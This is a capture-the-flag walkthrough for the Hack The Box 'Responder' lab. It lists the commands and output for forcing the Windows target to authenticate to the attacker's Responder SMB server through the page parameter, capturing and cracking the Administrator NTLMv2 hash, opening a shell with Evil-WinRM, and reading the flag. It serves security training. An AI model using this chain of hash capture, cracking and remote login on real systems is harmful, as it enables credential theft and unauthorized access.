

## 📝 Penetration Test Writeup: HTB Responder Machine

### 1\. Initial Reconnaissance and Vulnerability Identification

The target system (`10.129.95.234`) was identified as a Windows host running an Apache web server with a potential vulnerability in how it handles file requests.

#### 1.1. Host and Service Scan

A comprehensive Nmap scan identified the primary entry point.

| Command | Purpose | Output/Finding |
| :--- | :--- | :--- |
| `sudo nmap -A 10.129.95.234` | Aggressive scan for open ports, versions, and OS detection. | **Port 80/tcp** open (Apache httpd 2.4.52 with PHP). OS guessed as Windows XP. |

#### 1.2. Host File Mapping

The hostname was added to the local hosts file for easier access.

| Command | Purpose |
| :--- | :--- |
| `echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts` | Maps the IP to the hostname `unika.htb`. |

### 2\. Exploitation: NTLM Hash Capture

The presence of a file path in the HTTP request (`http://unika.htb/index.php?page=//10.129.95.234/somefile`) suggests a potential **Local File Inclusion (LFI)** vulnerability or, more critically, a **Server Message Block (SMB)** file path handler that can be leveraged for credential interception. The attack utilized the **Responder** tool to spoof NetBIOS/LLMNR requests and capture an NTLMv2 hash.

#### 2.1. Responder Installation and Execution

Responder was installed and launched on the machine's VPN interface (`tun0`) to listen for incoming authentication requests.

| Command(s) | Purpose |
| :--- | :--- |
| **Missing:** `sudo apt install python3-aioquic -y` | **Necessary** dependency installation (successfully resolved in the log). |
| `sudo python3 Responder.py -I tun0` | Launches Responder on the VPN interface to spoof local name resolution services (LLMNR/NBT-NS) and host malicious servers (SMB). |

#### 2.2. NTLMv2 Hash Capture

The attacker browsed to a URI designed to force the target server (`10.129.95.234`) to authenticate to the attacker's SMB server (`10.10.14.13`).

| Action | Purpose | Capture Result |
| :--- | :--- | :--- |
| Access URI: `http://unika.htb/index.php?page=\\10.10.14.13\somefile` (Implied from the Responder log, though not shown) | Triggers the Windows machine to try and authenticate to the attacker's IP, providing its hash. | **Username:** `Administrator` <br> **Hash Type:** NTLMv2-SSP <br> **Captured Hash:** `Administrator::RESPONDER:35d104f4b3495eb6:AC6B8F55FB5072BE747D1222539C8F25:0101000000...` |

### 3\. Post-Exploitation: Credential Cracking and Access

The captured NTLMv2 hash was written to a file (`hash.txt`) and subjected to a password cracking attack using **John the Ripper (JtR)** and the `rockyou.txt` wordlist.

#### 3.1. Cracking the Hash

The **rockyou.txt** wordlist was downloaded, and JtR was installed and used to crack the hash.

| Command(s) | Purpose | Cracking Result |
| :--- | :--- | :--- |
| `sudo apt install john -y` | Installs the John the Ripper cracking utility. | *(Successfully installed)* |
| `wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt` | Downloads a common wordlist. | *(Successfully downloaded)* |
| `john --wordlist=rockyou.txt hash.txt` | Attempts to crack the NTLMv2 hash using the wordlist. | **Password Found (Implied):** `badminton` |
| `john --show hash.txt` | Shows cracked passwords. | **Administrator:badminton** (Implied by the successful Evil-WinRM login below) |

#### 3.2. Gaining Remote Shell Access

The **Evil-WinRM** tool was used to gain an interactive PowerShell shell using the cracked credentials.

| Command(s) | Purpose | Connection Result |
| :--- | :--- | :--- |
| `sudo apt install ruby-full -y` | Installs Ruby, the dependency for Evil-WinRM (successfully installed). | *(Successfully installed)* |
| `sudo gem install evil-winrm` | Installs the Evil-WinRM tool (successfully installed). | *(Successfully installed)* |
| `evil-winrm -i 10.129.95.234 -u Administrator -p badminton` | Connects to the target Windows machine via WinRM using the cracked credentials. | **Successful Connection** (`*Evil-WinRM* PS C:\Users\Administrator\Documents>`) |

### 4\. Objective Completion (Flag Retrieval)

Once authenticated as **Administrator**, the file system was navigated to find the flag in the directory of the low-privileged user, **mike**.

| Command(s) | Purpose | Output/Finding |
| :--- | :--- | :--- |
| `cd C:\Users\mike\Desktop` | Navigates to the user's desktop directory. | *(Successful directory change)* |
| `type flag.txt` | Reads the contents of the final flag file. | **Flag:** `ea81b7afddd03efaa0945333ed147fac` |

### **Summary of Exploit Chain**

**Vulnerability:** Weak handling of SMB file paths in the web application (or server configuration) and the use of a guessable password by the Administrator account.
**Exploit:** NTLMv2 hash spoofing/capture using Responder.
**Result:** Unauthorized remote command execution as the **Administrator** user.

